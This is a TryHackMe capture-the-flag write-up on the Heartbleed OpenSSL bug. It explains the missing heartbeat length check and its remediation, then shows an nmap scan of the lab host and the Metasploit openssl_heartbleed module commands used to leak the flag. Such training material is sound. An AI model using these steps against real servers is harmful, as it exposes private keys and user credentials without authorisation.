# HeartBleed TryHackMe Writeup

## Background Information

Introduction to Heartbleed and SSL/TLS

On the internet today, most web servers are configured to use SSL/TLS. SSL(secure socket layer) is a predecessor to TLS(transport layer security). The most common versions are TLS 1.2 and TLS 1.3(recently released). Configuring a web server to use TLS means that all communication from that particular server to a client will be encrypted; any malicious third party that has access to this traffic will not be able to understand/decrypt the traffic, and they also will not be able to modify the traffic. To learn more about how TLS connections are established, check 1.2 and 1.3 out.

Heartbleed is a bug due to the implementation in the OpenSSL library from version 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This, in turn, allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS), including:

Server private key
Confidential data like usernames, passwords, and other personal information
Analyzing the Bug

The implementation error occurs in the heartbeat message that OpenSSL uses to keep a connection alive even when no data is sent. A mechanism like this is important because if a connection dies/resets quite often, it would be expensive to set up the TLS aspect of the connection again; this affects the latency across the internet, and it would make using services slow for users. A heartbeat message sent by one end of the connection contains random data and the data's length; this exact data is sent back when received by the other end of the connection. When the server retrieves this message from the client, here's what it does:

The server constructs a pointer(memory location) to the heartbeat record
It then copies the length of the data sent by a user into a variable(called payload)
The length of this data is unchecked
The server then allocates memory in the form of:
1 + 2 + payload + padding(this can be maximum of 1 + 2 + 65535 + 16)
The server then creates another pointer(bp) to access this memory
The server then copies the payload number of bytes from data sent by the user to the bp pointer
The server sends the data contained in the bp pointers to the user.
With this, you can see that the user controls the amount and length of data they send over. If the user does not send over any data(where the length is 0), it means that the server will copy arbitrary memory into the new pointer(which is how it can access secret information on the server). When retrieving data this way, the data can be different with different responses as the memory on the server will change.

Remediation

To ensure that arbitrary data from the server isn't copied and sent to a user, the server needs to check the length of the heartbeat message:

The server needs to check that the length of the heartbeat message sent by the user isn't 0
The server needs to check the length doesn't exceed the specified length of the variable that holds the data
References:

http://heartbleed.com/
https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html
https://stackabuse.com/heartbleed-bug-explained/

No Answer needed

## Protecting Data in Transit

```
nmap -A -T4 -v -p- 34.255.10.55
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:99:20:fe:1f:59:c3:eb:2b:ea:43:a2:03:77:d9:f4 (RSA)
|   256 37:81:3e:2e:e1:ee:68:7b:be:df:4e:db:01:f4:b3:22 (ECDSA)
|_  256 49:ab:e1:4b:f6:5b:3b:ad:bf:52:b3:36:cf:8f:a6:a8 (EdDSA)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          50281/udp  status
|_  100024  1          52007/tcp  status
443/tcp   open  ssl/http nginx 1.15.7
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.15.7
|_http-title: What are you looking for?
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-16T10:41:14
| Not valid after:  2020-02-16T10:41:14
| MD5:   4b3a f45e a597 6f3f 06f6 e9d2 518a c1c4
|_SHA-1: 01e8 fa58 e5a0 5102 d9e3 2ee3 8212 9d28 3934 4d57
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
52007/tcp open  status   1 (RPC #100024)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/1%OT=22%CT=1%CU=37257%PV=N%DS=2%DC=T%G=Y%TM=660A1150
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:1%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3
OS:=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=FF%W=6903%O=M5B4NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)
```

We already know that there is a vulnerability - HeartBleed.

Let's start `msfconsole`
```
msf6 > search heartbleed
Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak

msf6 > use 1
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 34.255.10.55
RHOSTS => 34.255.10.55
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
[HERE YOU WILL FIND THE FLAG]
```
'''
code
'''